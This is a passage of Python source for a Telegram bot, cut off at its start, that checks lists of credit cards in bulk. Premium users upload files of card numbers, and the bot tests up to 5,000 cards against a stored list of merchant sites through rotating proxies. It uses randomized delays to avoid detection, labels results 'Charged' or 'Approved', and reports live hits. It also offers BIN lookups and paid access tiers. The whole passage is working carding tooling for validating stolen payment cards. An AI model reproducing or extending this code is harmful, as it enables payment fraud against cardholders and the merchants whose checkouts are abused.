    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sites.txt is empty."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f" 🔄 Starting fast worker-based check...\n\n🔘 Scanned: 0/{len(sites)}\n⚡Alive: 0\n❌ Dead: 0"), parse_mode='html')

    alive_sites = []
    dead_sites = []
    start_time = time.time()

    # WORKER-BASED CONCURRENT PROCESSING
    # Configurable number of workers - adjust based on your server capacity
    MAX_WORKERS = 50  # Process 50 sites concurrently

    async def process_site_batch(site_batch):
        """Process a batch of sites concurrently"""
        tasks = []
        for site in site_batch:
            proxy = random.choice(proxies)
            task = test_site_with_details(site, proxy)
            tasks.append(task)
        return await asyncio.gather(*tasks, return_exceptions=True)

    try:
        total_sites = len(sites)
        processed = 0
        last_update = time.time()

        # Process sites in worker batches
        for i in range(0, total_sites, MAX_WORKERS):
            batch = sites[i:i + MAX_WORKERS]

            # Process current batch with workers
            results = await process_site_batch(batch)

            # Process results
            for idx, result in enumerate(results):
                site = batch[idx]
                if isinstance(result, Exception):
                    dead_sites.append(site)
                elif result.get('status') == 'alive':
                    alive_sites.append(site)
                else:
                    dead_sites.append(site)

            processed += len(batch)

            # Update progress every 1 second or on completion
            current_time = time.time()
            if current_time - last_update >= 1 or processed >= total_sites:
                elapsed = int(current_time - start_time)
                hours = elapsed // 3600
                minutes = (elapsed % 3600) // 60
                seconds = elapsed % 60
                time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

                # Calculate speed
                sites_per_second = processed / elapsed if elapsed > 0 else 0

                progress_text = f"""⏳ Fast Worker Mode Active ⚡

🔘 Scanned: {processed}/{total_sites}
⚡Alive: {len(alive_sites)}
❌ Dead: {len(dead_sites)}
⏱️ Time: {time_str}
🚀 Speed: {sites_per_second:.1f} sites/sec
👷 Workers: {MAX_WORKERS}"""

                await status_msg.edit(premium_emoji(progress_text), parse_mode='html')
                last_update = current_time

        # Final save of alive sites
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        elapsed = int(time.time() - start_time)
        final_text = f"""🔥 Fast Check Complete! ⚡

⚡Alive: {len(alive_sites)}
❌ Dead: {len(dead_sites)}
⏱️ Total Time: {elapsed//60}m {elapsed%60}s
🚀 Avg Speed: {len(sites)/elapsed:.1f} sites/sec"""

        await status_msg.edit(premium_emoji(final_text), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        url_to_remove = event.message.text.split(' ', 1)[1].strip()
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Site removed!\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Please reply to a .txt file with the command:\n<code>/addsites</code>"), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Processing sites file..."), parse_mode='html')
    
    try:
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        
        os.remove(file_path)
        
        if not sites:
            await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
            return
        
        await status_msg.edit(premium_emoji(f"🔄 Checking {len(sites)} sites before adding..."), parse_mode='html')
        
        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available to test sites."), parse_mode='html')
            return
        
        alive_sites = []
        dead_sites = []
        batch_size = 10
        
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site_with_details(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(premium_emoji(f"🔄 Checking sites...\n\nChecked: {len(alive_sites) + len(dead_sites)}/{len(sites)}\n✅ Alive: {len(alive_sites)}\n❌ Dead: {len(dead_sites)}"), parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        result_text = f"""✅ <b>Sites updated successfully!</b>

📊 Total sites received: {len(sites)}
✅ Alive (added): {len(alive_sites)}
❌ Dead (ignored): {len(dead_sites)}

🌐 <b>Added sites:</b>
{chr(10).join([f"• {s}" for s in alive_sites[:5]])}{'...' if len(alive_sites) > 5 else ''}"""

        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        
        
@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usage: <code>/addpremium user_id</code>"), parse_mode='html')
            return
        
        target_id = int(parts[1])
        
        if await add_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> added to premium!"), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("🎉 Congratulations! You have been granted premium access to the bot!"), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already premium."), parse_mode='html')
    
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usage: <code>/removepremium user_id</code>"), parse_mode='html')
            return
        
        target_id = int(parts[1])
        
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cannot remove admin from premium."), parse_mode='html')
            return
        
        if await remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ User <code>{target_id}</code> removed from premium."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("⚠️ Your premium access has been revoked."), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not premium."), parse_mode='html')
    
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    
    if not premium_users:
        await event.reply(premium_emoji("📭 No premium users found."), parse_mode='html')
        return
    
    premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
    
    await event.reply(premium_emoji(f"👑 <b>Premium Users ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return
    
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    
    stats_text = f"""📊 <b>Bot Statistics</b>

👑 <b>Admins:</b> {len(ADMIN_ID)}
💎 <b>Premium Users:</b> {len(premium_users)}
🌐 <b>Sites:</b> {len(sites)}
🔌 <b>Proxies:</b> {len(proxies)}

🤖 <b>Bot Status:</b> Running ✅"""
    
    await event.reply(premium_emoji(stats_text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'/start@\w+'))
async def handle_start_bot_username(event):
    """Handle /start@botname commands from groups."""
    await start(event)


@bot.on(events.NewMessage)
async def handle_txt_file_upload(event):
    """Handle direct .txt file uploads for card checking."""
    # Check if message is a file upload
    if not event.file:
        return

    # Check if it's a .txt file
    if not event.file.name or not event.file.name.endswith('.txt'):
        return

    user_id = event.sender_id

    # Check if premium user
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    # Check if sites and proxies available
    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    # Download and process the file
    file_path = await event.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await event.reply(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)
    file_name = event.file.name

    # Store cards data with a unique key for later retrieval
    # Use user_id + timestamp as key
    import time
    storage_key = f"{user_id}_{int(time.time() * 1000)}"
    uploaded_cards_data[storage_key] = {
        'cards': cards,
        'file_name': file_name,
        'timestamp': time.time()
    }

    # Show sample cards (first 5 and last indication)
    sample_cards_text = ""
    for i, card in enumerate(cards[:5]):
        sample_cards_text += f"⚡ {card}\n"

    remaining = total_cards - 5
    if remaining > 0:
        sample_cards_text += f"⚡ ... {remaining} more"

    # Create check button with card count and storage key
    buttons = [[Button.inline(f"👆 Check {total_cards} CCs", f"sptxt_check_{storage_key}")]]

    output = f"""⚡ 𝗙𝗶𝗹𝗲: {file_name}
⚡ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗖𝘀: {total_cards}

{sample_cards_text}

⚡ 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴."""

    await event.reply(premium_emoji(output), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"sptxt_check_(.+)"))
async def sptxt_check_callback(event):
    """Handle the check button click for sptxt file checking."""
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.answer("❌ Access Denied", alert=True)
        return

    # Get the storage key from the callback data
    match = event.pattern_match
    # Extract the storage key (format: userId_timestamp)
    storage_key = match.group(1).decode() if match else None

    if not storage_key or storage_key not in uploaded_cards_data:
        await event.answer("❌ Card data expired. Please re-upload the file.", alert=True)
        return

    # Inform user that checking is starting
    await event.answer("🔄 Starting check...", alert=False)

    # Retrieve cards from stored data
    try:
        cards = uploaded_cards_data[storage_key]['cards']
        file_name = uploaded_cards_data[storage_key]['file_name']

        # Clean up stored data
        del uploaded_cards_data[storage_key]

        if not cards:
            await event.edit(premium_emoji("❌ No cards found in the file."), parse_mode='html')
            return

        if len(cards) > 5000:
            cards = cards[:5000]

        total_cards = len(cards)

        # Update message to show starting
        status_msg = await event.edit(premium_emoji(f"🔥 Starting check for {total_cards} cards..."), parse_mode='html')

        session_key = f"{user_id}_{status_msg.id}"
        active_sessions[session_key] = {'paused': False}

        all_results = {
            'charged': [],
            'approved': [],
            'dead': [],
            'total': total_cards,
            'checked': 0,
            'start_time': time.time(),
            'last_card': '',
            'last_response': '',
            'last_price': '-',
            'last_gateway': 'Unknown'
        }

        try:
            queue = asyncio.Queue()
            for card in cards:
                queue.put_nowait(card)

            last_update_time = [time.time()]

            async def worker():
                card_count = 0
                while not queue.empty() and session_key in active_sessions:
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        break
                    while session_state.get('paused', False):
                        await asyncio.sleep(1)
                        session_state = active_sessions.get(session_key)
                        if not session_state:
                            return

                    try:
                        card = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break

                    card_count += 1
                    if card_count % 10 == 0:
                        await asyncio.sleep(random.uniform(5, 6))

                    current_sites = load_sites()
                    current_proxies = load_proxies()
                    if not current_sites or not current_proxies:
                        break

                    res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)

                    all_results['checked'] += 1
                    all_results['last_card'] = card
                    all_results['last_response'] = res.get('message', '')[:50]
                    all_results['last_price'] = res.get('price', '-')
                    all_results['last_gateway'] = res.get('gateway', 'Unknown')

                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                        await send_realtime_hit(user_id, res, 'Charged', username)
                    elif res['status'] == 'Approved':
                        all_results['approved'].append(res)
                        await send_realtime_hit(user_id, res, 'Approved', username)
                    else:
                        all_results['dead'].append(res)

                    queue.task_done()

                    now = time.time()
                    if now - last_update_time[0] >= 1.0:
                        last_update_time[0] = now
                        if session_key in active_sessions:
                            try:
                                await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                            except Exception:
                                pass

            workers = [asyncio.create_task(worker()) for _ in range(10)]

            while workers:
                if session_key not in active_sessions:
                    for w in workers:
                        if not w.done():
                            w.cancel()
                    break
                done, pending = await asyncio.wait(workers, timeout=1.0)
                workers = list(pending)

            if session_key in active_sessions:
                await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

        except Exception as e:
            await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
        finally:
            if session_key in active_sessions:
                del active_sessions[session_key]

            try:
                await status_msg.delete()
            except:
                pass

            await send_final_results(user_id, all_results)

    except Exception as e:
        await event.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/bin\s+'))
async def bin_lookup_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/bin 371618</code>"), parse_mode='html')
            return

        bin_input = args[1].strip()

        # Extract only digits
        bin_digits = ''.join(filter(str.isdigit, bin_input))

        if len(bin_digits) < 6:
            await event.reply(premium_emoji("❌ Please provide at least 6 digits for BIN lookup."), parse_mode='html')
            return

        # Use only first 6 digits for BIN lookup
        bin_number = bin_digits[:6]

        # Create a dummy card number with the BIN for get_bin_info function
        dummy_card = bin_number + "0000000000"

        status_msg = await event.reply(premium_emoji(f"🔄 Looking up BIN <code>{bin_number}</code>..."), parse_mode='html')

        brand, bin_type, level, bank, country, flag = await get_bin_info(dummy_card)

        # Format the output
        bin_output = f"""🔌 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽
🔥 ━━━━━━━━━━━━━━━━━━
💳 𝗕RAND   — <code>{brand}</code>
🏦 𝗕𝗔𝗡𝗞    — <code>{bank}</code>
🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 — <code>{country}</code> {flag}
ℹ️ 𝗧𝗬𝗣𝗘    — <code>{bin_type}</code>
📈 𝗟𝗘𝗩𝗘𝗟   — <code>{level}</code>
🛒𝗕𝗜𝗡 — <code>{bin_number}</code>
🔥 ━━━━━━━━━━━━━━━━━━

💡 Made by @White_DeviL3620"""

        await status_msg.edit(premium_emoji(bin_output), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(" Stopped", alert=True)
        await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')

print("✅ Bot started successfully!")
bot.run_until_disconnected()
